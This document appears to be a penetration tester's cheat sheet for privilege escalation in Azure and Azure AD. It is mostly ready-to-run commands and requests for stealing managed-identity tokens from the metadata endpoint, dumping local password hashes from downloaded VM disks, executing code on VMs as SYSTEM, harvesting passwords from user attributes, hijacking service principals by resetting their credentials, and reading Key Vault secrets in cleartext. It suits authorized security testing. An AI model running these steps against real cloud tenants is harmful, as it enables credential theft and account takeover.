# Privilege Escalation
- First step is determining what we can read
  - Key Vaults
  - VMs
  - Deployment scripts
  - AD user attribute data
  - Runbooks

## Virtual machines
### VM might be managed identity
- https://www.netspi.com/blog/technical/cloud-penetration-testing/azure-privilege-escalation-using-managed-identities/
- If you have access to a VM it might actually have more privileges than your user in Azure
- VM can auth to Azure with a Managed Identity by requesting Oauth token from Azure Metadata Service URL at http://169.254.169.254/metadata/identity/oauth2/token
- RDP to VM, request token, and connect to Azure using AZ cli or Az PowerShell

#### Login on VM as managed idenity
```
az login –identity
```

#### List permissions of current subscription
- May have more permissions then the user
```
az role assignment list -–assignee ((az account list | ConvertFrom-Json).id)
```

#### If no AZ module can request token manually 
- Then use Azure REST APIs with the token
```
Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
```

### Read password hashes from virtual machine
- Download the disk https://docs.microsoft.com/en-us/azure/virtual-machines/windows/download-vhd#generate-download-url

#### Check the disks
```
sudo fdisk –l
```

#### Mount the disk
```
sudo mkdir /media/mounted-drive
sudo mount /dev/sdc4 /media/mounted-drive/
```

#### Navigate to the windows snapshot
```
cd /media/mounted-drive/
ls
```

#### Copy system/SAM and dump hashes
```
cd /media/mounted-drive/Windows/System32/config/
cp SAM SYSTEM ~/
cd ~/
impacket-secretsdump -system SYSTEM -sam SAM LOCAL
```

### Execute commands
- Requires the "Virtual Machine Contributor" role
- Run as default by SYSTEM or root
- Commandid =  RunPowerShellScript or RunShellScript

```
Invoke-AzVMRunCommand -ResourceGroupName <resource group name> -VMName <VM name> -CommandId RunPowerShellScript -ScriptPath ./powershell-script.ps1
```

### Reset password from VM
- Can be done from Azure portal
- This may be a quick way to gain access and avoid PowerShell alerting
- Be careful though as scripts/services may be using the credential

## Ad user attributes
- User attributes and sensitive information

#### Request all attributes and look for password string
- Might also use token, secret, pass etc.
```
$users = Get-MsolUser; foreach($user in $users){$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; foreach($prop in $props){if($user.$prop -like "*password*"){Write-Output ("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop)}}} 
```

## Service Principal Hijacking
- There are over 200 default service principals in an O365 tenant
- None of them are listed in the Azure GUI portal
- An “Application Administrator” can change passwords or certificates for service principals… even the default ones
- Some interesting permissions as identified by Dirk-Jan Mollema: https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/
- Application Admin can’t add users to groups but can change the password of a service principal that can add users to groups.

#### List service principals as Application Administrator
```
Get-AzureAdServicePrincipal
```

#### Change password of service prinicpal
```
$spn = Get-AzureADServicePrincipal -SearchString "<SPN DISPLAY NAME>"
New-AzureADServicePrincipalPasswordCredential -objectid $spn.ObjectId -EndDate "12-31-2099 12:00:00" -StartDate "6-8-2018 13:37:00" -Value "<PASSWORD>"
```

- One way to quickly determine what service principals might be useful would be list out all roles for each service
- Not easily done through PowerShell Cmdlets
- Change password for a service principal
- Use cred to auth with Microsoft Graph scope
- Brute force all Object ID’s against Microsoft Graph endpoint that responds with role information
- Web request for auth to Microsoft Graph
```
POST /<tenant ID>/oauth2/v2.0/token HTTP/1.1
Host: login.microsoftonline.com
client_id=<application 
ID>&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default&client_secret=
<service principal password>&grant_type=client_credentials
```
- A bearer token should be returned if auth was successful
- Then use the bearer token with the following request setting the service principal ObjectID against graph.windows.net
```
GET /beta/servicePrincipals/<Service Principal ObjectID> HTTP/1.1

Host: graph.microsoft.com
Authorization: Bearer <JWT Bearer Token Value>
```
- Response contains role information
- Next, something like Burp’s Intruder could be used to brute force each service principal ID against the Microsoft Graph endpoint URL
```
$apps = Get-AzADServicePrincipal
$apps.Id
```
- Now we can choose what level of access we want and change the pass for that service principal

## Break glass accounts
- Another PrivEsc target is Azure “Break Glass” administrative accounts
- Microsoft recommends not setting up MFA for them
- Two accounts are usually recommended to be set up
- If you can determine which ones are the break glass they can be good targets

## Azure key vaults
#### List key vaults which current user has view access too
```
az keyvault list --query '[].name' --output tsv
```

#### Get URI of keyvault
```
az keyvault secret list --vault-name <KEYVAULT> --query '[].id' --output tsv
```

#### Read cleartext secrets
```
az keyvault secret show --id <URI from last command> | ConvertFrom-Json
```

#### Give access if contributer role
```
az keyvault set-policy --name <KEYVAULT NAME> --upn <CONTRIBUTER USERNAME> --secret-permissions get list --key-permissions get list --storage-permissions get list --certificate-permissions get list
```

#### Powerzure get keyvault contents
```
Get-AzureKeyVaultContent
```
